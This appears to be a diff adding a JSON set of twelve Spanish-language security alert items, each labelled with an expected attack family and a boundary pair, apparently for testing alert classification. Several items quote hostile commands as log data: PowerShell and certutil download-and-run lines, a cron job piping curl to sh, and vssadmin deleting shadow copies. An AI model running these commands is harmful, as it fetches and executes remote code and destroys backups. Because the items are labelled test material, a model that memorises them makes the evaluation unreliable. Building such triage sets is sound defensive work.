@@ -1,0 +1,74 @@
+[
+  {
+    "id": "CF-01",
+    "texto": "Rule: 60204 (level 10) -> 'Multiple Windows Logon Failures' | Agent: srv-dc-01 (192.0.2.5) | Location: EventChannel | win.system.eventID: 4625 | win.eventdata.ipAddress: 192.0.2.47 (pc-ventas-12) | win.eventdata.logonType: 3 | win.eventdata.status: 0xc000006d | Contexto: el equipo interno pc-ventas-12 intentó autenticarse por SMB contra 15 servidores distintos con las cuentas admin.local y operador02; 64 fallos en 4 min y ningún inicio de sesión correcto",
+    "familia_esperada": "F1",
+    "frontera": "F1/F3"
+  },
+  {
+    "id": "CF-02",
+    "texto": "Rule: 100340 (level 10) -> 'Sesiones RDP desde una estación de trabajo hacia varios servidores' | Agent: srv-bd-02 (192.0.2.20) | Location: EventChannel | win.system.eventID: 4624 | win.eventdata.logonType: 10 (RemoteInteractive) | win.eventdata.targetUserName: admin.local | win.eventdata.ipAddress: 192.0.2.47 (pc-ventas-12) | Contexto: sin fallos de autenticación previos; en 12 min la misma estación abrió sesiones RDP correctas en srv-fich-01, srv-app-03, srv-dc-01 y srv-bd-02; la cuenta no suele usarse desde ese equipo",
+    "familia_esperada": "F3",
+    "frontera": "F1/F3"
+  },
+  {
+    "id": "CF-03",
+    "texto": "Rule: 100140 (level 10) -> 'Cuenta de servicio usada en un inicio de sesión interactivo' | Agent: pc-contab-03 (192.0.2.36) | Location: EventChannel | win.system.eventID: 4624 | win.eventdata.logonType: 2 (Interactive) | win.eventdata.targetUserName: svc_respaldo | win.eventdata.workstationName: PC-CONTAB-03 | Contexto: svc_respaldo es una cuenta de servicio que solo debe autenticarse en srv-fich-01; inicio de sesión en la consola del equipo a las 23:40, sin conexiones hacia otros equipos",
+    "familia_esperada": "F1",
+    "frontera": "F1/F3"
+  },
+  {
+    "id": "CF-04",
+    "texto": "Rule: 100350 (level 12) -> 'Servicio PSEXESVC instalado y cmd.exe lanzado por él' | Agent: srv-fich-01 (192.0.2.12) | Location: EventChannel | win.system.eventID: 7045 | win.eventdata.serviceName: PSEXESVC | win.eventdata.imagePath: %SystemRoot%\\PSEXESVC.exe | proceso hijo: C:\\Windows\\System32\\cmd.exe /c net group \"Domain Admins\" /domain | Contexto: inicio de sesión de red (4624, logonType 3) con EJEMPLO\\admin.local desde 192.0.2.31 (pc-adm-07) 1 s antes",
+    "familia_esperada": "F3",
+    "frontera": "F2/F3"
+  },
+  {
+    "id": "CF-05",
+    "texto": "Rule: 100240 (level 12) -> 'PowerShell descarga y ejecuta un binario en la carpeta temporal del usuario' | Agent: pc-adm-07 (192.0.2.31) | Location: EventChannel | win.system.eventID: 1 (Sysmon) | win.eventdata.parentImage: C:\\Windows\\explorer.exe | win.eventdata.commandLine: powershell.exe -c \"iwr http://descargas.example/u.exe -OutFile $env:TEMP\\u.exe; & $env:TEMP\\u.exe\" | win.eventdata.user: EJEMPLO\\usuario01 | Contexto: lanzado desde la sesión local del usuario; el proceso u.exe sigue en ejecución y no hay conexiones entrantes",
+    "familia_esperada": "F2",
+    "frontera": "F2/F3"
+  },
+  {
+    "id": "CF-06",
+    "texto": "Rule: 100360 (level 12) -> 'wsmprovhost.exe lanza PowerShell (ejecución remota por WinRM)' | Agent: srv-bd-02 (192.0.2.20) | Location: EventChannel | win.system.eventID: 1 (Sysmon) | win.eventdata.parentImage: C:\\Windows\\System32\\wsmprovhost.exe | win.eventdata.image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | win.eventdata.commandLine: powershell.exe -c \"Get-LocalGroupMember Administradores; whoami /all\" | win.eventdata.user: EJEMPLO\\admin.local | Contexto: conexión WinRM entrante (puerto 5985) desde 192.0.2.31 (pc-adm-07)",
+    "familia_esperada": "F3",
+    "frontera": "F2/F3"
+  },
+  {
+    "id": "CF-07",
+    "texto": "Rule: 554 (level 5) -> 'File added to the system.' | Agent: srv-app-03 (192.0.2.22) | Location: syscheck | syscheck.path: /etc/cron.d/actualiza | syscheck.diff: '*/5 * * * * root curl -s http://descargas.example/a.sh | sh' | syscheck.audit.user.name: www-data | syscheck.audit.process.name: /usr/bin/bash | Contexto: el archivo no existía en la línea base",
+    "familia_esperada": "F5",
+    "frontera": "F2/F5"
+  },
+  {
+    "id": "CF-08",
+    "texto": "Rule: 100250 (level 12) -> 'certutil.exe usado para descargar un ejecutable' | Agent: pc-ventas-12 (192.0.2.47) | Location: EventChannel | win.system.eventID: 1 (Sysmon) | win.eventdata.image: C:\\Windows\\System32\\certutil.exe | win.eventdata.commandLine: certutil.exe -urlcache -split -f http://descargas.example/p.exe C:\\Users\\Public\\p.exe | win.eventdata.parentImage: C:\\Windows\\System32\\cmd.exe | win.eventdata.user: EJEMPLO\\usuario02 | Contexto: 3 s después se ejecutó C:\\Users\\Public\\p.exe; no se observaron tareas, servicios ni claves de registro nuevas",
+    "familia_esperada": "F2",
+    "frontera": "F2/F5"
+  },
+  {
+    "id": "CF-09",
+    "texto": "Rule: 100260 (level 14) -> 'Borrado de instantáneas de volumen con vssadmin' | Agent: srv-fich-01 (192.0.2.12) | Location: EventChannel | win.system.eventID: 1 (Sysmon) | win.eventdata.image: C:\\Windows\\System32\\vssadmin.exe | win.eventdata.commandLine: vssadmin.exe delete shadows /all /quiet | win.eventdata.parentImage: C:\\Users\\Public\\upd.exe | win.eventdata.user: NT AUTHORITY\\SYSTEM | Contexto: se eliminaron 14 instantáneas; en el mismo minuto syscheck registró 2300 archivos modificados en D:\\compartido con extensión .lock",
+    "familia_esperada": "F5",
+    "frontera": "F2/F5"
+  },
+  {
+    "id": "CF-10",
+    "texto": "Rule: 100620 (level 12) -> 'Inundación de paquetes SYN entrantes' | Agent: srv-fw-01 (192.0.2.1) | Location: /var/log/firewall.log | dstip: 192.0.2.10 (srv-web-01) | dstport: 443 | src_zone: internet | 410000 paquetes SYN por segundo desde 230 IP distintas | uso del enlace de entrada: 97 % | uso del enlace de salida: 6 % | Contexto: el portal web no responde desde hace 8 min",
+    "familia_esperada": "F6",
+    "frontera": "F4/F6"
+  },
+  {
+    "id": "CF-11",
+    "texto": "Rule: 100540 (level 10) -> 'Conexiones periódicas a un destino externo desconocido' | Agent: srv-fw-01 (192.0.2.1) | Location: /var/log/firewall.log | srcip: 192.0.2.36 (pc-contab-03) | dstip: 192.0.2.240 | dstport: 443 | dst_zone: internet | 1 conexión cada 60 s (desviación de 1 s) durante 9 h | bytes_out por conexión: 1,2 KB | Contexto: destino sin reputación conocida ni relación previa con la organización; proceso de origen C:\\Users\\usuario03\\AppData\\Roaming\\sync\\upd.exe",
+    "familia_esperada": "F4",
+    "frontera": "F4/F6"
+  },
+  {
+    "id": "CF-12",
+    "texto": "Rule: 100630 (level 12) -> 'Servidor DNS interno usado para amplificación' | Agent: srv-dns-01 (192.0.2.53) | Location: /var/log/named/query.log | 95000 consultas ANY por minuto con origen falsificado 192.0.2.250 | bytes_out: 6 GB en 15 min hacia 192.0.2.250 (dst_zone: internet) | uso del enlace de salida: 92 % | Contexto: las respuestas son registros DNS públicos, no datos internos; la resolución de nombres de la oficina falla desde hace 10 min",
+    "familia_esperada": "F6",
+    "frontera": "F4/F6"
+  }
+]
